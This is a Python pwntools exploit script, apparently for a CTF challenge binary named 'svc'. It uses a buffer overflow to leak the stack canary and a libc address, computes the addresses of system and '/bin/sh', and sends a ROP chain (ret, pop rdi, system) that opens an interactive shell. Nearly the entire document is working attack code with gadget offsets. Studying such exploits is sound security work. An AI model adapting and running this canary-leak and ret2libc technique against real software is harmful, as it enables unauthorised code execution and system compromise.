from pwn import * 

target = process("./svc")

pop_rdi =  p64(0x0000000000400ea3)

payload =b""

payload += b"A" * 168
def get_stuff(payload, byte_num):
	sleep(1)
	target.sendline(b"1")
	sleep(1)
	target.sendline(payload)
	sleep(1)
	target.sendline(b"2")
	sleep(1)
	target.recvuntil(b"AAAAA\n")
	sleep(1)
	thing = int.from_bytes(target.recvn(byte_num)[::-1])
	return thing

def get_out(payload):
	sleep(1)
	
	target.sendline(b"1")

	sleep(1)
	target.sendline(payload)
	#gdb.attach(target, '''break * 0x00400dde''')
	sleep(1)
	
	target.sendline(b"3")
	sleep(1)

def print_hex(stuff):
	print(hex(stuff))


canary = get_stuff(payload, 7)
print(hex(canary))
sleep(1)


sleep(1)
payload = b"A" * 183
target.recvuntil(b"GOOD TO GO")
leak = get_stuff(payload, 6)

print(hex(leak))

bin_sh = leak + 0x1a1265
print_hex(bin_sh)

system = leak + 0x2e586
print_hex(system)

payload = b"A" * 168+ b"\x00" + p64(canary)+ b"A"*7 
payload += p64(0x00000000004008b1) # ret
payload += pop_rdi
payload += p64(bin_sh)
payload += p64(system)

get_out(payload)

target.interactive()
# distance to overflow: 0xb8
# 0x0000000000400ea3 : pop rdi ; ret
# 
# 0x00000000004008d0 : puts@plt
# 0x0000000000602018 <puts@got.plt>

